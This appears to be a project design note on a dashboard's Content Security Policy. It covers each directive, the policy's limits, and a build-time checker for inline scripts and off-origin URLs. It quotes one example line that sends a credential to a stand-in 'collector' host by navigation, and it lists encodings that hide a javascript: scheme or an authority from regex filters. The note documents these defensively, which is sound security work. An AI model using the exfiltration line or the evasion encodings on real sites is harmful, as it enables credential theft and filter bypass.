---
name: dashboard-shell-csp
description: 'The dashboard shell CSP after #195 — what each directive is for, why style-src carries unsafe-inline and img-src exists at all (both measured, neither a control, do not report either as a weakness), that script-src has no unsafe-* and connect-src is self, what the policy does NOT bound (outbound navigation and WebRTC are outside CSP, so exfiltration is harder not closed — a finding saying so is correct), that every HTML document including /login carries it, what a change here has to re-verify in a browser rather than by reading the header, and that an external <a href> is deliberately not a finding in the build-side checker (issue #200 tracks the bundle-level gap)'
metadata:
  type: project
---

`DASHBOARD_CSP` in `crates/honmoon-mgmt/src/lib.rs`, served by `static_handler` on both the
embedded-asset branch and the SPA fallback (issue #195). Pinned verbatim by
`the_dashboard_shell_carries_a_script_bounding_csp` in `crates/honmoon-mgmt/tests/e2e.rs`.

```
default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self';
connect-src 'self'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'
```

**What it is for.** #188 made the browser credential script-readable (`sessionStorage`), which is
what puts it beyond a sibling loopback port's reach — see `mgmt-api-auth-model`. `script-src 'self'`
and `connect-src 'self'` bound what a script injection in this origin would then cost. There is no
known injection: the bundle is first-party and embedded, the views render API data as text, and the
one `innerHTML`-class sink is `react-simple-code-editor`'s highlight layer fed `Prism.highlight`
output in `PolicyView`. Defence in depth, not a vulnerability fix — a finding that describes it as
closing a live hole has the framing wrong in the other direction.

**`style-src 'unsafe-inline'` is deliberate and forced, not laxity — do not report it as a
weakness.** `react-simple-code-editor` 0.14.1 renders an unconditional
`React.createElement('style', { dangerouslySetInnerHTML: … })` (`lib/index.js:401`). Measured in
Chrome: under `style-src 'self'` that element raises a `style-src-elem` violation and its `sheet`
is `null`; under the shipped policy it applies (2 `cssRules`). `'unsafe-inline'` in one directive
does not reach another, so `script-src` is unaffected. Hashing the element instead was considered
and rejected: it would pin a Rust constant to a transitive npm package's exact CSS text, and a
dependency bump would break it silently.

**`img-src 'self'` is not a control either.** No view loads an image. It is there because Chrome
probes `/favicon.ico` unasked — measured: with the directive the request is made, and with it
removed from the same build the request never leaves.

**What the policy does NOT bound, so the bound is not cited as wider than it is.** `connect-src`
covers `fetch`/XHR/`sendBeacon`/`EventSource`, and `img-src`/`form-action` cover the unscripted
carriers — but **no CSP directive in a shipping browser restricts outbound navigation**, so
`location.href = 'https://collector/' + secret` and `window.open` still leave with the credential
(`navigate-to` was specified and dropped). WebRTC is outside `connect-src` too and `webrtc 'block'`
is deliberately not set — closing it alone changes nothing while navigation is open. Exfiltration is
therefore **harder and quieter, not closed**, and a finding saying so is correct rather than a
re-report of something settled. This note previously said the credential had "nowhere to go"; that
was wrong and was corrected in the same PR.

**Every HTML document carries the policy, not just the shell.** `DOCUMENT_HEADERS` is applied by
`static_handler`'s two arms *and* by `/login`'s `401` refusal page. That last one matters because a
CSP binds the document it is served with, so a policy-free same-origin document is an escape from
this policy rather than a gap beside it — a script could open it and run there unbound. The e2e
test covers `/login?token=wrong` for that reason. Responses deliberately without it: `/healthz` and
the two 404 arms (`text/plain`), `/api/*` (JSON), and `/login`'s `303` (no rendered body).

**The invariant worth defending on any edit here** (it outlives the exact policy string): no
`'unsafe-inline'`, `'unsafe-eval'`, `'unsafe-hashes'` or `*` in `script-src`, and `connect-src`
stays `'self'`. The e2e test asserts both separately from the verbatim pin for that reason.

**Verify a change in a browser, not by reading the header.** A CSP that breaks the dashboard is
worse than none, and the header is served identically either way. What was actually run for #195
(`Skill("run-honmoon")` + `agent-browser`): load the printed login URL, walk all four views,
confirm `/api/audit`, `/api/approvals` and `/api/policy` return 200 and the Policy view renders
Prism tokens, and check `agent-browser console` / `errors` are empty. The enforcement control that
proves the policy is not a no-op: with a `securitypolicyviolation` listener installed, append an
inline `<script>` and fetch a sibling loopback port — observed
`script-src-elem`/`connect-src`/`img-src`/`frame-src` violations and `inlineRan: false`.

**`script-src 'self'` depends on the *build*, which no Rust test can see.** The CI job builds the
dashboard only in the JS job, so `cargo test` runs against the script-less placeholder
`crates/honmoon-mgmt/build.rs` writes — a Rust assertion about inline script there would pass
vacuously. `scripts/check-dashboard-csp.ts` is the guard instead: it runs after `bun run build` and
`bun demo/build.ts` in CI and refuses an inline `<script>`, an off-origin `src`, an off-origin
`href` on a *subresource* element, a `javascript:` URL anywhere, an inline handler (quoted or not), a
`<base>`, a `<form>`, a `<script>` opening tag it could not read to a `</script>` — and a shell with
no `<script>` at all, which is how it refuses to pass on that placeholder. Attribute values need not
be quoted, a quoted `>` does not end a tag, and values are decoded the way the HTML parser decodes
them (`java&#x73;cript:`, `javascript&colon;`, an embedded tab) before the scheme is read — all
three were misses fixed under review, so do not re-report them. Decoding is deliberately one pass:
`&amp;#x73;` is literal text in the DOM, and a second pass would invent a finding on a working link.

**Whether a URL is off-origin or `javascript:` is decided by `new URL`, not by a pattern — and a
finding proposing a pattern for it is going backwards.** Four review rounds found four ways a regex
reads a URL differently from the browser that will fetch it: a hidden scheme (`java&#x73;cript:`), a
hidden authority (`&sol;&sol;host`), a leading space (` https://host`, which a browser strips before
reading the scheme), and a backslash authority (`/\host`, which a browser reads as `//host`). The
parser handles all four and every later one of that shape, so the only normalisation left in this
file is the HTML-level character-reference decode that must happen *before* the parser sees the
value. An unparseable URL is reported, not skipped.

It resolves against **two** stand-in bases and asks whether the results differ, rather than
comparing to one stand-in's origin: the serving origin is not known at build time (the gateway uses
whatever `--mgmt-addr` it was given, the demo build Cloudflare Pages), so there is no host to compare
against, and a URL naming the single stand-in would have read as same-origin. A relative URL follows
its base and the two differ; an absolute one resolves identically under both and is off-origin
wherever the shell is served. Do not propose comparing against a configured host — there isn't one.

**`NAMED_REFS` is a deliberate subset and its gaps are closed by reporting, not by growing it.** A
name the table does not cover is reported — "cannot decode, refusing to pass" — the same stance as
the unreadable-`<script>` rule, so a finding of the form "the table is missing `&<name>;`" is
answered by that rule rather than by an edit. Two guards keep that from failing a working link, and
both are tested: the scan runs over the *raw* attribute token by token, so `&amp;hellip;` is one
known reference plus literal text rather than an unknown one; and a `;` is required, so `?a=1&b=2`
is a query string. Malformed numeric references (`&#x110000;`, a lone surrogate, `&#0;`) decode to
U+FFFD as the spec says rather than throwing — a `RangeError` in CI is a stack trace where a finding
belongs, and leaves the shell unchecked.

**An external `<a href>` is deliberately NOT a finding** and re-reporting it is wrong: CSP governs
what the document fetches, not where a link takes the reader, so failing CI over a working link
would be the checker's own "a CSP that breaks the dashboard is worse than none". Four reviewers
raised it in one round against the version that did flag it; `NAVIGATION_HREF` is the fix, and
`<link href>` stays checked because that one is a fetch. A `javascript:` href is the exception to
the exception — it is code, not navigation.

**That guard reads the shell HTML only, not the emitted bundle**, so it would not catch a dependency
that introduces `eval(`/`new Function(` — which `script-src 'self'` refuses, since no `'unsafe-eval'`
is present. Verified absent from today's bundle; tracked as issue #200, so a finding about the
*bundle* is in scope while one about the shell's script tags is not.
